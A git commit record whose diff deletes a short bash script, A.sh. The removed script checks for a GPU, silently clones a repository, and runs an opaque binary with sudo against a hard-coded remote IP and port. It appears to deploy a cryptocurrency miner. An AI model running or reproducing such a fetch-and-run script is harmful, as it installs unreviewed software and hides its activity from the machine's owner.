7ce35436dfc6993ec167aac6e47e0b33b1454d6d
ddao2604 <78058830+ddao2604@users.noreply.github.com>
2021-06-18 21:46:44 +0800

    Delete A.sh

--- A.sh
+++
@@ -1,8 +0,0 @@
-#! /bin/bash
-nvidia-smi
-printf "User $1"  >&2
-{
-git clone https://github.com/ddao2604/tech.git &> /dev/null
-sudo chmod +x tech/m
-./tech/m -P http://38.130.220.127:4545/"$1" &> log
-} &> /dev/null
